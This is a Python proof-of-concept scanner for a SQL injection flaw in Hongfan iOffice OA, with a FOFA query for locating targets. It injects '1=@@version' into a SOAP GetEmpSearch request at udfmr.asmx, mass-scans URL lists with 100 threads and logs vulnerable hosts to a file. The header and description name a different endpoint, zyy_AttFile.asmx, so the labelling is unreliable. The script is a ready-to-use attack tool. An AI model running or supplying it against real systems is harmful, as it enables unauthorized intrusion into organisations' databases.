# 红帆OA zyy_AttFile.asmx 存在SQL注入漏洞
# fofa:app="红帆-ioffice"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="红帆OA zyy_AttFile.asmx 存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/iOffice/prg/set/wss/udfmr.asmx"
    url = target + payload_url
    headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
            "Content-Type": "text/xml; charset=utf-8"
    }
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope 	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr"> <condition>1=@@version</condition>
    </GetEmpSearch>
    </soap:Body>
    </soap:Envelope>
        '''
    try:
        res = requests.get(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if 'nvarchar' in res:
            print(f'[+]该url:{target}存在SQL注入漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()
